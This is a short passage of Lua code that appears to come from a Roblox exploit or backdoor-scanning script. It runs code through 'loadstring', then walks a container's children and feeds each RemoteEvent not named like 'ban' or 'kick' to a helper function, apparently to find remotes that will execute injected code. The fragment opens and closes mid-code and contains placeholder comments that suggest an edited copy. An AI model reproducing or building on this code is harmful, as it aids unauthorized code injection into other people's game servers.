                       loadstring(_2)()
                    end)
                    ]]
			)
		end
		for i, v in pairs(see:GetChildren()) do
			--[[3 lines]]
			if v:IsA("RemoteEvent") then
				if not string.match(string.lower(v.Name), "ban") then
					if not string.match(string.lower(v.Name), "kick") then
						a(v)
					end
				end
			end
			--[[-3 lines]]
			b_G_V12(v) --[[test]]
		end
	end
